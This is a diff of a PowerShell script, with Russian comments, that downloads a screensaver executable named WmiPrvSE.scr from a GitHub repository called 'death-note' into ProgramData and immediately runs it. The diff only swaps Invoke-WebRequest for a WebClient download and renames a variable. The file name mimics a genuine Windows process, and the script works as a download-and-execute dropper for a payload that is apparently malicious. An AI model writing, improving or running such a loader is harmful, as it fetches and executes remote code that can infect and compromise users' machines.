@@ -1,22 +1,25 @@
 $url = "https://github.com/andezzzWW/death-note/raw/refs/heads/main/WmiPrvSE.scr"
-$output = "$env:programdata\WmiPrvSE.scr"
+$destination = "$env:programdata\WmiPrvSE.scr"
 
 try {
     # Скачивание файла
     Write-Host "Загрузка файла..." -ForegroundColor Yellow
-    Invoke-WebRequest -Uri $url -OutFile $output -ErrorAction Stop
-    
+    $webClient = New-Object System.Net.WebClient
+    $webClient.DownloadFile($url, $destination)
+    $webClient.Dispose()
+
     # Проверка существования файла
-    if (Test-Path $output) {
+    if (Test-Path $destination) {
         Write-Host "Файл успешно загружен. Запуск..." -ForegroundColor Green
         
         # Запуск файла
-        Start-Process -FilePath $output -Wait
+        Start-Process -FilePath $destination -Wait
+        Write-Host "Выполнение завершено." -ForegroundColor Green
     }
     else {
-        Write-Host "Ошибка: файл не был загружен" -ForegroundColor Red
+        Write-Host "Ошибка: Файл не найден после загрузки." -ForegroundColor Red
     }
 }
 catch {
-    Write-Host "Ошибка при загрузке: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "Ошибка: $($_.Exception.Message)" -ForegroundColor Red
 }
